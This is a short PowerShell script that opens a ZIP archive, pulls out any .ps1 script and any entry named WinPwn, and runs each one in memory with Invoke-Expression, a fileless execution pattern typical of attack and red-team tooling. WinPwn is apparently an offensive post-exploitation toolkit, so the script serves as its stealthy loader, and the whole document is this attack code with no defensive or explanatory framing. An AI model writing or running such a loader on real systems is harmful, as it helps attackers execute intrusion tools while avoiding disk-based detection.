# Load required .NET assemblies
Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Open ZIP archive
$zipArchive = [System.IO.Compression.ZipFile]::OpenRead($zipFilePath)

# Find and run PS1 script
$ps1Entry = $zipArchive.Entries | Where-Object { $_.FullName -match '\.ps1$' }
if ($ps1Entry) {
    $ps1Stream = $ps1Entry.Open()
    $reader = New-Object System.IO.StreamReader($ps1Stream)
    $ps1Content = $reader.ReadToEnd()
    $reader.Close()
    Invoke-Expression $ps1Content  # Run PS1 in memory
}

# Find and run WinPwn script
$winPwnEntry = $zipArchive.Entries | Where-Object { $_.FullName -match 'WinPwn' }
if ($winPwnEntry) {
    $winPwnStream = $winPwnEntry.Open()
    $reader = New-Object System.IO.StreamReader($winPwnStream)
    $winPwnContent = $reader.ReadToEnd()
    $reader.Close()
    Invoke-Expression $winPwnContent  # Run WinPwn in memory
}

# Cleanup
$zipArchive.Dispose()
